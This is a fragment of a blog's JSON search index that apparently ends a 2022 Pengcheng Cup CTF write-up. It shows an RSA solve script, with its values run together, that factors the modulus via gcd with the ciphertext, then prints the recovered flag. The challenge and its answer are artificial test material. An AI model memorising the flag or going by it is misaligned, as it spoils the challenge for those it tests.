0x1bd2a47a5d275ba6356e1e2bd10d6c870693be540e9318c746e807a7672f3a75cc63841170126d7dba52d7f6f9cf0f8dce9705fc1785cc670b2658b05d4b24d8918f95594844bfa920c8ffe73160c2c313b3fdbc4541ec19828165e34afa7d05271cc6fd59d08138b88c11677e6ac3b39cff525dcb19694b0388d895f53805a5e5bd8cfb947080e4855aaf83ebd85a397526f7d76d26031386900cb44a2e4bd121412bcee7a6c1e9af411e234f130e68a428596265d3ec647e50f65cb81393f4bd38389a2b9010fd715582506b9054dc235aced50757462b77a5606f116853af0c1ea3c7cf0d304f885d86081f8bac8b67b0625122f75448c5b6eb8f1cc8a0dfn = 0xc2b17c86a8950f6dafe0a633890e4271cfb20c5ffda2d6b3d035afa655ed05ec16c67b18832ed887f2cea83056af079cc75c2ce43c90cce3ed02c2e07d256f240344f1734adeee6dc2b3b4bbf6dcfc68518d0a74e3e66f1865db95ef4204457e6471903c2321ac97f3b8e3d8d935896e9fc9145a30a3e24e7c320490a9944c1e94d301c8388445532699e6189f4aa6a86f67f1d9b8fb0de4225e005bd27594cd33e36622b2cd8eb2781f0c24d33267d9f29309158942b681aab81f39d1b4a73bd17431b46a89a0e4c2c58b1e24e850355c63b72392600d3fff7a16f6ef80ea515709da3ef1d28782882b0dd2f76bf609590db31979c5d1fd03f75d9d8f1c5069e = 0x10001p=gmpy2.gcd(c,n)q=n//pphi=(p-1)*(q-1)d=gmpy2.invert(e,phi)m=pow(c,d,n)//2022//1011//pprint(long_to_bytes(m))# 977260aae9b5} flag: PCL{16745c3b0c134c83b74f977260aae9b5}","link":"/2022/07/06/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B-2022-WP/"}],"tags":[{"name":"ctf","slug":"ctf","link":"/tags/ctf/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"协议","slug":"协议","link":"/tags/%E5%8D%8F%E8%AE%AE/"},{"name":"云攻防","slug":"云攻防","link":"/tags/%E4%BA%91%E6%94%BB%E9%98%B2/"}],"categories":[{"name":"CTF-复现","slug":"CTF-复现","link":"/categories/CTF-%E5%A4%8D%E7%8E%B0/"},{"name":"CTF-WP","slug":"CTF-WP","link":"/categories/CTF-WP/"},{"name":"web笔记","slug":"web笔记","link":"/categories/web%E7%AC%94%E8%AE%B0/"}],"pages":[]}